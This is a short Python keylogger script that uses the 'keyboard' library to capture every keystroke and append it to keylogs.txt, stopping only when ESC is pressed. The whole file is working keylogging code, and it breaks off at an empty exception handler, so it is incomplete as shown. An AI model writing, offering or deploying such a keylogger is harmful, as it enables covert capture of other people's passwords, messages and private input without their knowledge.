import keyboard
import sys

def main():
    try:
        with open("keylogs.txt", "a") as f:
            while True:
                event = keyboard.read_event()
                
                if event.name == 'esc': # termination key is ESC
                    break
                    
                if len(event.name) > 1: # special keys are enclosed in brackets
                    f.write("[" + event.name.upper() + "]")
                else:
                    f.write(event.name)
                    
                f.flush() # ensure writes are saved immediately
                
        print("Keylogs saved to keylogs.txt")
        
    except Exception as e:
